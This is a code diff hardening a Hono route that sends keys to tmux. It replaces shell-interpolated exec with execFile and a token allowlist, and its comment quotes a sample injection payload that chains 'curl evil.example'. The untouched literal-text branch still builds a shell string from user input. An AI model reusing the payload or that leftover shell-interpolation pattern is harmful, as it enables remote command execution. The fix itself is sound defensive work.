@@ -1,7 +1,33 @@
 import { Hono } from "hono";
+import { execFile } from "node:child_process";
+import { promisify } from "node:util";
 import { execAsync, sendToTmux, TMUX_SESSION } from "../utils.js";
 
+const execFileAsync = promisify(execFile);
+
 const app = new Hono();
+
+/**
+ * Allowlist regex for raw tmux key tokens. A raw `send-keys` call accepts
+ * things like `Escape`, `BTab`, `Up`, `Down`, `C-a`, `M-Left`, `S-F1` — all
+ * of which fit `^[A-Za-z][A-Za-z0-9_-]*$`. Anything else (shell metachars,
+ * whitespace other than the single-space token separator, semicolons, backticks,
+ * subshells, etc.) is rejected with 400.
+ *
+ * Space-separated multi-key strings are allowed (tmux supports
+ * `send-keys Escape Up Up`) but each token must independently match. The split
+ * happens on `\s+` so the shell can never see a metachar.
+ *
+ * Security rationale: the previous implementation wired `body.keys` directly
+ * into `tmux send-keys -t <session> <keys>` via `exec()`, which spawns
+ * `/bin/sh -c` and interprets the whole string as a shell command. A POST
+ * containing `{"raw":true,"keys":"Escape; curl evil.example"}` would execute
+ * the curl as the `claude` user. The new implementation routes through
+ * `execFile` with an argv array (no shell) AND enforces the token allowlist
+ * so even a future regression in execFile cannot leak shell metacharacters to
+ * tmux's own key parser.
+ */
+const RAW_KEY_TOKEN = /^[A-Za-z][A-Za-z0-9_-]*$/;
 
 app.post("/send-keys", async (c) => {
   try {
@@ -11,8 +37,23 @@ app.post("/send-keys", async (c) => {
       return c.json({ ok: false, error: "keys required" }, 400);
     }
     if (body.raw) {
-      // Raw tmux key names (Escape, BTab, etc.) — no -l flag, no Enter
-      await execAsync(`tmux send-keys -t ${TMUX_SESSION} ${keys}`);
+      // Split on whitespace and validate each token against the allowlist.
+      // Reject empty-after-split (e.g. all whitespace input) so we never call
+      // tmux with zero key args.
+      const tokens = keys.split(/\s+/).filter(Boolean);
+      if (tokens.length === 0) {
+        return c.json({ ok: false, error: "keys required" }, 400);
+      }
+      for (const tok of tokens) {
+        if (!RAW_KEY_TOKEN.test(tok)) {
+          return c.json(
+            { ok: false, error: `invalid raw key token: ${tok}` },
+            400,
+          );
+        }
+      }
+      // execFile with argv — no shell, no interpolation.
+      await execFileAsync("tmux", ["send-keys", "-t", TMUX_SESSION, ...tokens]);
     } else {
       // Literal text — use -l to avoid special char issues, then Enter
       await execAsync(`tmux send-keys -t ${TMUX_SESSION} -l ${JSON.stringify(keys)}`);
